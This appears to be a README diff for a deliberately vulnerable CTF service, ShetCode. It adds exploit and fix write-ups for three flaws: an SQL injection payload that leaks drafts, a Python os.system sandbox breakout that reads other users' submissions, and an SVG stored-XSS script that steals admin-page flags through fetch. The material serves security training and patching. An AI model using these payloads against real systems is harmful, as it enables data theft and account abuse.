@@ -51,7 +51,7 @@ ShetCode is a [LeetCode](https://leetcode.com/)-like platform built with Symfony
 
 ```bash
 git clone https://github.com/enowars/enowars9-service-shetcode.git
-enowars9-service-shetcode
+cd enowars9-service-shetcode
 cd service
 # Optionally set secrets
 export POSTGRES_DB=app
@@ -160,12 +160,6 @@ docker compose up --build -d
 
 ## Flagstores
 
-### FS0: Draft Problem Descriptions
-- Stored in problem `description` when creating as draft.
-- Retrieval path: owner visits `GET /problems/{id}/edit`.
-- Exploit path: see SQL injection below to leak unpublished problems.
-- [TODO] Add PoC snippet and sample screenshot
-
 ### FS1: Saved Solution Files
 - User submission saved at `public/submissions/{user_id}/{problem_id}/solution.py`.
 - Problem detail preloads prior solution; viewing reveals content.
@@ -183,22 +177,204 @@ docker compose up --build -d
 This service contains 3 Flagstores:
 
 ### SQL Injection in Problems API
-- Location: `App\DatabaseManager\FindProblemsByAuthorId::execute()` builds SQL with string concatenation of `author_username`.
-- Impact: bypass `is_published = true`, leak drafts (FS0).
-- Mitigation [TODO]: parameterized queries / QueryBuilder.
-- PoC [TODO]: `author_username = anything' OR '1'='1' -- `
+
+#### Exploit
+The first flagstore is stored in problem `description` when creating as draft.
+- Location: `App\DatabaseManager\FindProblemsByAuthorId::execute()` builds SQL with string concatenation of `author_username` instead of prepared statements:
+
+```php
+$sql = "SELECT p.title as title, p.difficulty as difficulty, p.is_published as is_published, p.id as id, p.description as description FROM problems p JOIN users u ON p.author_id = u.id WHERE p.is_published = true";
+if ($authorUsername) {
+    $sql .= " AND u.username = '" . $authorUsername . "'";
+}
+
+$preparedStatement = $this->entityManager->getConnection()->prepare($sql);
+$result = $preparedStatement->executeQuery();
+return $result->fetchAllAssociative();
+```
+Bypass ``author_username = anything' OR '1'='1' -- `` as query parameter leaks drafts.
+
+#### Fix
+
+The most obvious fix is to use prepared statements in ORM instead of concatenating strings:
+
+```php
+$sql = "SELECT p.title as title, p.difficulty as difficulty, p.is_published as is_published, p.id as id, p.description as description FROM problems p JOIN users u ON p.author_id = u.id WHERE p.is_published = true";
+$parameters = [];
+
+if ($authorUsername) {
+    $sql .= " AND u.username = :username";
+    $parameters['username'] = $authorUsername;
+}
+
+$preparedStatement = $this->entityManager->getConnection()->prepare($sql);
+$result = $preparedStatement->executeQuery($parameters);
+return $result->fetchAllAssociative();
+```
+
 
 ### Sandbox Breakout via Code Execution
+#### Exploit
+The second flagstore is stored in submitted solutions of problems. Some data in docker container is not properly isolated with nsjail and Python code is not cleaned up. This allows users to upload the malicious code that retrieves the data on a disk:
+
+```python
+import os
+os.system('find ../var/www/html/public/submissions -type f -name "solution.py" | while read -r file; do echo "===== $file ====="; cat "$file"; echo; done')
+```
+
 - Location: `App\Service\CodeExecutor` mounts `public/submissions` read-only in nsjail and runs `/usr/bin/python3`.
-- Impact: submitted code can read other users’ `solution.py` files (FS1).
-- PoC [TODO]: `os.system('find /var/www/html/public/submissions -type f -name "solution.py" -exec cat {} \;')`
-- Mitigation [TODO]: per-user chroot, remove global mount, separate storage per-tenant, better jail profile.
+
+#### Fix
+There are two ways to fix the exploit.
+The first way is to properly isolate the data with nsjail and forbid access to solutions folder:
+```
+$cmd = [
+                     'nsjail',
+                     '--user',         '99999',
+                     '--group',        '99999',
+                     '--disable_proc',
+-                    '--bindmount_ro', '/var/www/html/public/submissions:/var/www/html/public/submissions',
+                     '--bindmount',    "$userProblemDir:/sandbox:rw",
++                    '--tmpfsmount',   "/var/www/html/public/submissions",
+                     '--chroot',       '/',
+                     '--cwd',          '/sandbox',
+                     '--',             '/usr/bin/python3', 'solution.py',
+]
+```
+The second way is to properly cleanup submitted Python code. This is an untrivial task as malicious code can use patterns like `im/**/port os; os.system('ls’)` or `getattr(__builtins__, "__import__")("o" + "s").system("ls")` instead of simple `import os`. One possible way is to use additional packages like [RestrictedPython](https://github.com/zopefoundation/RestrictedPython):
+
+```python
+#!/usr/bin/env python3
+# runner.py
+
+import sys
+import json
+from RestrictedPython import compile_restricted, safe_builtins
+from RestrictedPython.Guards import (
+    safer_getattr,
+    full_write_guard,
+    guarded_iter_unpack_sequence,
+)
+from RestrictedPython.Eval import (
+    default_guarded_getiter,
+    default_guarded_getitem,
+)
+
+class DirectPrinter:
+    def __init__(self, *args, **kwargs):
+        pass
+
+    def _call_print(self, args, kwargs=None):
+        if kwargs is None:
+            kwargs = {}
+        if not isinstance(args, (tuple, list)):
+            args = (args,)
+        print(*args, **kwargs)
+
+with open('solution.py', 'r') as f:
+    src = f.read()
+
+glb = {
+    '__builtins__':          safe_builtins,             
+    '_getattr_':             safer_getattr,             
+    '_getitem_':             default_guarded_getitem,   
+    '_getiter_':             default_guarded_getiter,   
+    '_iter_unpack_sequence_':guarded_iter_unpack_sequence, 
+    '_write_':               full_write_guard,          
+    '_print_':               DirectPrinter,            
+}
+
+glb['__builtins__'].update({
+    'input': input,
+    'len':   len,
+    'int':   int,
+    'str':   str,
+})
+
+try:
+    import warnings
+    warnings.filterwarnings(
+        "ignore",
+        message=".*never reads 'printed' variable.*",
+        category=SyntaxWarning
+    )
+    byte_code = compile_restricted(src, '<string>', 'exec')
+    exec(byte_code, glb, None)
+
+    printed = glb.get('printed')
+    if printed:
+        sys.stdout.write(printed)
+
+except Exception as e:
+    sys.stderr.write(f"ERROR: {e}")
+    sys.exit(1)
+```
 
 ### Stored XSS via SVG in Admin Feedback
-- Location: `templates/admin/feedback.html.twig` uses `{{ item.image|raw }}` to inline untrusted image bytes.
-- Impact: arbitrary JS in admin context, used to exfiltrate flags into private problems (FS2).
-- PoC [TODO]: SVG with `<script>`.
-- Mitigation [TODO]: never inline untrusted data; serve via `<img src>`, sanitize SVG, enforce CSP, or convert to safe raster.
+#### Exploit
+The third flagstore is stored in submitted feedback. The service does not clean up the uploaded SVG images. A malicious script inside SVG can retrieve the flags from the page and send them to other server or somewhere in Shetcode service (the checker uses private problems for that).
+
+Example SVG image with malicious script:
+
+```
+<?xml version="1.0" standalone="no"?>
+    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+    <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+        <script type="text/javascript">
+          (async () => {{
+            try {{
+                const rows = document.querySelectorAll('tbody tr');
+                if (rows.length === 0) {{
+                return;
+                }}
+
+                for (const row of rows) {{
+                const cell = row.querySelector('td:nth-child(3)');
+                const feedbackText = cell ? cell.textContent.trim() : '';
+                
+                if (!feedbackText || feedbackText === 'SCRIPTED_FLAG_CAPTURED') {{
+                    continue;
+                }}
+                
+                const flag = feedbackText;
+
+                const params = new URLSearchParams({{
+                    title:           flag,
+                    description:     `Captured feedback: ${{flag}}`,
+                    difficulty:      'Easy',
+                    testCases:       JSON.stringify(['dummy input']),
+                    expectedOutputs: JSON.stringify(['dummy output']),
+                    maxRuntime:      '1.0',
+                    isPublished:     'false',
+                    isPrivate:       'true',
+                    accessUsers:     '{my_username}'
+                }});
+
+                const res = await fetch('/problems/create', {{
+                    method:      'POST',
+                    credentials: 'include',
+                    headers:     {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
+                    body:        params.toString()
+                }});
+                }}
+            }} catch (e) {{
+            }}
+          }})();
+        </script>
+        <rect width="100" height="100" fill="blue" />
+    </svg>
+```
+
+#### Fix
+The submitted images must properly be cleaned up. This also can be done with additional packages:
+
+```
+use enshrined\svgSanitize\Sanitizer;
+...
+
+  $sanitizer = new Sanitizer();
+  $cleanSVG = $sanitizer->sanitize($imageContent);
+```
 
 ## File Structure
 
